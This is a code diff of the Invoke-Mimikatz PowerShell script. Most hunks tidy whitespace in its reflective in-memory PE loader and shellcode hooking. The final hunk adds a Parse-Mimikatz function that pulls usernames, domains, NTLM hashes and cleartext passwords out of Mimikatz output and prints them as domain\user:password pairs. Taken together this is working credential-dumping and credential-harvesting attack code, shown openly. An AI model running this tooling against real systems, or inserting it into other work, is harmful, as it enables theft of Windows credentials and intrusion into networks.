@@ -4,7 +4,7 @@ function Invoke-Mimikatz
 .SYNOPSIS
 
 This script leverages Mimikatz 2.0 and Invoke-ReflectivePEInjection to reflectively load Mimikatz completely in memory. This allows you to do things such as
-dump credentials without ever writing the mimikatz binary to disk. 
+dump credentials without ever writing the mimikatz binary to disk.
 The script has a ComputerName parameter which allows it to be executed against multiple computers.
 
 This script should be able to dump credentials from any version of Windows through Windows 8.1 that has PowerShell v2 or higher installed.
@@ -19,7 +19,7 @@ Mimikatz version: 2.1.1-20180616 ()
 
 .DESCRIPTION
 
-Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any 
+Reflectively loads Mimikatz 2.0 in memory using PowerShell. Can be used to dump credentials without writing anything to disk. Can be used for any
 functionality provided with Mimikatz.
 
 .PARAMETER DumpCreds
@@ -356,7 +356,7 @@ $RemoteScriptBlock = {
         $e_res2Field.SetCustomAttribute($AttribBuilder)
 
         $TypeBuilder.DefineField('e_lfanew', [Int32], 'Public') | Out-Null
-        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()   
+        $IMAGE_DOS_HEADER = $TypeBuilder.CreateType()
         $Win32Types | Add-Member -MemberType NoteProperty -Name IMAGE_DOS_HEADER -Value $IMAGE_DOS_HEADER
 
         #Struct IMAGE_SECTION_HEADER
@@ -1563,7 +1563,7 @@ $RemoteScriptBlock = {
                 #   Site: http://msdn.microsoft.com/en-us/magazine/cc301808.aspx
                 if (($RelocType -eq $Win32Constants.IMAGE_REL_BASED_HIGHLOW) `
                         -or ($RelocType -eq $Win32Constants.IMAGE_REL_BASED_DIR64))
-                {           
+                {
                     #Get the current memory address and update it based off the difference between PE expected base address and actual base address
                     [IntPtr]$FinalAddr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$MemAddrBase) ([Int64]$RelocOffset))
                     [IntPtr]$CurrAddr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FinalAddr, [Type][IntPtr])
@@ -1575,7 +1575,7 @@ $RemoteScriptBlock = {
                     else
                     {
                         [IntPtr]$CurrAddr = [IntPtr](Sub-SignedIntAsUnsigned ([Int64]$CurrAddr) ($BaseDifference))
-                    }               
+                    }
 
                     [System.Runtime.InteropServices.Marshal]::StructureToPtr($CurrAddr, $FinalAddr, $false) | Out-Null
                 }
@@ -1848,7 +1848,7 @@ $RemoteScriptBlock = {
         )
         
         #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
-        $ReturnArray = @() 
+        $ReturnArray = @()
         
         $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
         [UInt32]$OldProtectFlag = 0
@@ -2050,7 +2050,7 @@ $RemoteScriptBlock = {
             $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
             $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)
             
-            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then 
+            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
             #   call ExitThread
             Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
             $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
@@ -2281,9 +2281,9 @@ $RemoteScriptBlock = {
         
         [IntPtr]$PEEndAddress = Add-SignedIntAsUnsigned ($PEHandle) ([Int64]$PEInfo.SizeOfImage)
         if ($PEHandle -eq [IntPtr]::Zero)
-        { 
+        {
             Throw "VirtualAlloc failed to allocate memory for PE. If PE is not ASLR compatible, try running the script in a new PowerShell process (the new PowerShell process will have a different memory layout, so the address the PE wants might be free)."
-        }       
+        }
         [System.Runtime.InteropServices.Marshal]::Copy($PEBytes, 0, $PEHandle, $PEInfo.SizeOfHeaders) | Out-Null
         
         
@@ -2557,7 +2557,7 @@ $RemoteScriptBlock = {
 #       {
 #           Write-Verbose "Getting SeDebugPrivilege"
 #           Enable-SeDebugPrivilege -Win32Functions $Win32Functions -Win32Types $Win32Types -Win32Constants $Win32Constants
-#       }   
+#       }
         
         if (($ProcId -ne $null) -and ($ProcId -ne 0))
         {
@@ -2742,4 +2742,108 @@ $DomainSID = $parts2[0..($parts2.Count-2)] -join '-';
 $results = Main;
 "Hostname: $HostName / $DomainSID";
 $results
+}
+
+
+
+function Parse-Mimikatz {
+param(
+    [Parameter(
+        Position=0,
+        Mandatory=$true,
+        ValueFromPipeline=$true,
+        ValueFromPipelineByPropertyName=$true)
+    ]
+    [String[]]$raw
+    )
+
+    # msv
+	$results = $raw | Select-String -Pattern "(?s)(?<=msv :).*?(?=tspkg :)" -AllMatches | %{$_.matches} | %{$_.value}
+    if($results){
+        foreach($match in $results){
+            if($match.Contains("Domain")){
+                $lines = $match.split("`n")
+                foreach($line in $lines){
+                    if ($line.Contains("Username")){
+                        $username = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Domain")){
+                        $domain = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("NTLM")){
+                        $password = $line.split(":")[1].trim()
+                    }
+                }
+                if ($password -and $($password -ne "(null)") -and (!$username.Contains('$'))){
+                    $domain+"\"+$username+":"+$password
+                }
+            }
+        }
+    }
+    $results = $raw | Select-String -Pattern "(?s)(?<=tspkg :).*?(?=wdigest :)" -AllMatches | %{$_.matches} | %{$_.value}
+    if($results){
+        foreach($match in $results){
+            if($match.Contains("Domain")){
+                $lines = $match.split("`n")
+                foreach($line in $lines){
+                    if ($line.Contains("Username")){
+                        $username = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Domain")){
+                        $domain = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Password")){
+                        $password = $line.split(":")[1].trim()
+                    }
+                }
+                if ($password -and $($password -ne "(null)") -and (!$username.Contains('$'))){
+                    $domain+"\"+$username+":"+$password
+                }
+            }
+        }
+    }
+    $results = $raw | Select-String -Pattern "(?s)(?<=wdigest :).*?(?=kerberos :)" -AllMatches | %{$_.matches} | %{$_.value}
+    if($results){
+        foreach($match in $results){
+            if($match.Contains("Domain")){
+                $lines = $match.split("`n")
+                foreach($line in $lines){
+                    if ($line.Contains("Username")){
+                        $username = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Domain")){
+                        $domain = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Password")){
+                        $password = $line.split(":")[1].trim()
+                    }
+                }
+                if ($password -and $($password -ne "(null)") -and (!$username.Contains('$'))){
+                    $domain+"\"+$username+":"+$password
+                }
+            }
+        }
+    }
+    $results = $raw | Select-String -Pattern "(?s)(?<=kerberos :).*?(?=ssp :)" -AllMatches | %{$_.matches} | %{$_.value}
+    if($results){
+        foreach($match in $results){
+            if($match.Contains("Domain")){
+                $lines = $match.split("`n")
+                foreach($line in $lines){
+                    if ($line.Contains("Username")){
+                        $username = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Domain")){
+                        $domain = $line.split(":")[1].trim()
+                    }
+                    elseif ($line.Contains("Password")){
+                        $password = $line.split(":")[1].trim()
+                    }
+                }
+                if ($password -and $($password -ne "(null)") -and (!$username.Contains('$'))){
+                    $domain+"\"+$username+":"+$password
+                }
+            }
+        }
+    }
 }
